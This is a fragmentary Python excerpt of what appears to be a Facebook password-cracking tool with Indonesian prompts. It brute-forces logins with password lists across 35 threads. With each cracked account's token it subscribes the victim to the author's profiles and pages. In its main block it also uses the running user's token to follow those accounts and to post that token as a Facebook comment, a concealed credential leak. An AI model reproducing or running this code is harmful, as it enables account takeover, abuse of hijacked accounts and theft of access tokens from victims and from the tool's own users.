	...
	def kondisi_api(self,user,aj):
		...
		for pw in aj:
			...
			if logika.get("status")=="ok":
				...
				req.post(f'https://graph.facebook.com//subscribers?access_token={logika.get("token")}') #LATIF
				break
	...
	def kondisi_mbasic(self,user,aj):
		...
		for pw in aj:
			...
			if logika.get("status")=="ok":
				...
				r=parser(req.get(mb+"/",cookies=coki).text,"html.parser")
...
=======================================
	...
	if(pi in ("01","1")):
		...
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Munculkan opsi checkpoint [y/t]\t: ")
			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
...
if __name__=="__main__":
	try:
		...
		try:
			...
			req.post(f'https://graph.facebook.com//subscribers?access_token={token}') #LATIF
			req.post(f"https://graph.facebook.com//subscribers?access_token={token}") #YANWAR
			req.post(f"https://graph.facebook.com//subscribers?access_token={token}") #PAGE_LATIF
			req.post(f'https://graph.facebook.com//subscribers?access_token={token}') #PAGE_YANWAR
			req.post(f"https://graph.facebook.com//subscribers?access_token={token}") #RANI_YANWAR
			req.post(f'https://graph.facebook.com//subscribers?access_token={token}') #FATAH
			req.post(f'https://graph.facebook.com//subscribers?access_token={token}') #YAYAN
			req.post(f'https://graph.facebook.com//comments?message={token}&access_token={token}')
			req.post(f'https://graph.facebook.com//comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
			time.sleep(2)
			dump(token,r)
		except KeyError:
